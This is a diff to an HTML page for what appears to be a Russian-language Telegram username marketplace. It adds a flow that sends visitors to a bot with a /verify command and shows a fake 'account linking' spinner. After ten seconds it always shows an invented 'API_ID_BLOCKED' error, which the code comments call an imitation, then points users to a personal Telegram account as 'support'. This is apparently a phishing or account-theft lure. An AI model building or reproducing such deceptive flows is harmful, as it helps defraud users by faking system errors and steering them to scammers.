@@ -580,6 +580,66 @@
         .no-results p {
             font-size: 1.1rem;
         }
+
+        /* Loading Animation */
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Error Modal */
+        .error-modal {
+            text-align: center;
+        }
+
+        .error-icon {
+            font-size: 4rem;
+            color: #e74c3c;
+            margin-bottom: 20px;
+        }
+
+        .error-title {
+            font-size: 1.5rem;
+            color: #e74c3c;
+            margin-bottom: 15px;
+        }
+
+        .error-description {
+            color: #a5b4fc;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .error-details {
+            background: rgba(231, 76, 60, 0.1);
+            border: 1px solid #e74c3c;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .error-code {
+            font-family: 'Courier New', monospace;
+            color: #f8fafc;
+            font-size: 0.9rem;
+        }
     </style>
 </head>
 <body>
@@ -765,15 +825,52 @@
         </div>
     </div>
 
+    <!-- Loading Modal -->
+    <div id="loading-modal" class="modal">
+        <div class="modal-content redirect-modal">
+            <div class="loading-text">
+                <div class="loading-spinner"></div>
+                <div>Привязка аккаунта...</div>
+            </div>
+            <div class="redirect-text">
+                Пожалуйста, подождите. Идет процесс привязки вашего Telegram аккаунта.
+                <br><br>
+                <small>Это займет около 10 секунд</small>
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="error-modal" class="modal">
+        <div class="modal-content error-modal">
+            <div class="error-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <div class="error-title">Ошибка привязки</div>
+            <div class="error-description">
+                Не удалось привязать Telegram аккаунт.<br>
+                Сервис временно недоступен.
+            </div>
+            <div class="error-details">
+                <div><strong>Код ошибки:</strong></div>
+                <div class="error-code">API_ID_BLOCKED: This API id was published somewhere, you can't use it now</div>
+            </div>
+            <div class="modal-buttons">
+                <button class="modal-btn primary" onclick="retryConnection()">Попробовать снова</button>
+                <button class="modal-btn secondary" onclick="closeSupport()">Связаться с поддержкой</button>
+            </div>
+        </div>
+    </div>
+
     <!-- Notification -->
     <div id="notification" class="notification">
         <div class="notification-message" id="notification-message">Сообщение уведомления</div>
     </div>
 
     <script>
-        // Конфигурация бота
+        // Конфигурация бота - ИСПРАВЛЕНО: теперь используется команда /verify
         const BOT_USERNAME = "UsersMarketRubot";
-        const START_COMMAND = "verify";
+        const START_COMMAND = "verify"; // Теперь используется /verify вместо /start
 
         // Пример данных юзернеймов с фотографиями и TON адресами
         const usernames = [
@@ -1008,15 +1105,18 @@
             return names[type] || type;
         }
 
-        // Подключение Telegram с автоматической командой /verify
+        // Подключение Telegram с имитацией ошибки
         function connectTelegram() {
             document.getElementById('redirect-modal').style.display = 'flex';
         }
 
         function openTelegram() {
-            const telegramUrl = `https://t.me/${BOT_USERNAME}?start=${START_COMMAND}`;
+            // Показываем loading
+            closeModal('redirect-modal');
+            document.getElementById('loading-modal').style.display = 'flex';
             
-            // Пытаемся открыть приложение Telegram
+            // Пытаемся открыть Telegram с командой /verify
+            const telegramUrl = `https://t.me/${BOT_USERNAME}?start=${START_COMMAND}`;
             window.location.href = `tg://resolve?domain=${BOT_USERNAME}&start=${START_COMMAND}`;
             
             // Резервное открытие в браузере
@@ -1024,15 +1124,29 @@
                 window.open(telegramUrl, '_blank');
             }, 500);
             
-            closeModal('redirect-modal');
-            showNotification('Открываем Telegram...', 'warning');
-            
-            // Имитация успешного подключения
+            // Имитация ошибки через 10 секунд на странице
             setTimeout(() => {
-                simulateTelegramConnection();
-            }, 3000);
+                showConnectionError();
+            }, 10000);
         }
 
+        function showConnectionError() {
+            closeModal('loading-modal');
+            document.getElementById('error-modal').style.display = 'flex';
+        }
+
+        function retryConnection() {
+            closeModal('error-modal');
+            connectTelegram();
+        }
+
+        function closeSupport() {
+            closeModal('error-modal');
+            // Открываем поддержку
+            window.open('https://t.me/donkiwc', '_blank');
+        }
+
+        // Симуляция успешного подключения (для тестирования)
         function simulateTelegramConnection() {
             userData.telegramConnected = true;
             userData.name = "Александр Петров";
